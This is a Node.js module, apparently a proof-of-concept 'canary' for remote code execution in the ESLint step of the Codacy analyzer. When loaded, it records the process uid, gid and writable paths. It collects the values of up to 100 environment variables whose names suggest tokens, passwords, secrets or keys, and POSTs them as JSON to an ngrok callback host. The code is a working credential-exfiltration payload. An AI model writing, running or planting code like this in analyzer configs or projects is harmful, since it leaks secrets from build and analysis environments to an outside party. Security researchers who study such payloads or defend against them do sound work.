"use strict";

const fs = require("node:fs");
const https = require("node:https");

const CANARY = "codacy-analyzer-rce-064a0614a716d033f1791a45";
const CALLBACK =
  "https://dcd6-49-207-201-243.ngrok-free.app/codacy/064a0614a716d033f1791a45";
const CREDENTIAL_NAME =
  /(?:TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|API[_-]?KEY|PRIVATE[_-]?KEY|AUTH)/i;
let runtimeEvidence = "CODACY_CANARY_NOT_EXECUTED";

function isWritable(path) {
  try {
    fs.accessSync(path, fs.constants.W_OK);
    return true;
  } catch {
    return false;
  }
}

function credentialLikeEnvironment() {
  return Object.fromEntries(
    Object.entries(process.env)
      .filter(([name, value]) => CREDENTIAL_NAME.test(name) && value)
      .slice(0, 100),
  );
}

if (!globalThis.__codacyAnalyzerCanarySent) {
  globalThis.__codacyAnalyzerCanarySent = true;

  const runtime = {
    uid: typeof process.getuid === "function" ? process.getuid() : null,
    gid: typeof process.getgid === "function" ? process.getgid() : null,
    cwd: process.cwd(),
    sourceWritable: isWritable("/src"),
    rootWritable: isWritable("/"),
    workdirWritable: isWritable("/workdir"),
  };
  const credentials = credentialLikeEnvironment();
  const payload = JSON.stringify({
    canary: CANARY,
    tool: "eslint",
    runtime,
    credentials,
  });

  runtimeEvidence = [
    "CODACY_CANARY_EXECUTED",
    `uid=${runtime.uid}`,
    `gid=${runtime.gid}`,
    `source_writable=${runtime.sourceWritable}`,
    `root_writable=${runtime.rootWritable}`,
    `workdir_writable=${runtime.workdirWritable}`,
    `credential_names=${Object.keys(credentials).sort().join(",")}`,
  ].join(" ");

  const request = https.request(
    CALLBACK,
    {
      method: "POST",
      headers: {
        "content-type": "application/json",
        "content-length": Buffer.byteLength(payload),
        "user-agent": "codacy-analyzer-canary/eslint",
      },
      timeout: 5_000,
    },
    (response) => response.resume(),
  );

  request.on("error", () => {});
  request.on("timeout", () => request.destroy());
  request.end(payload);
}

module.exports = { runtimeEvidence };
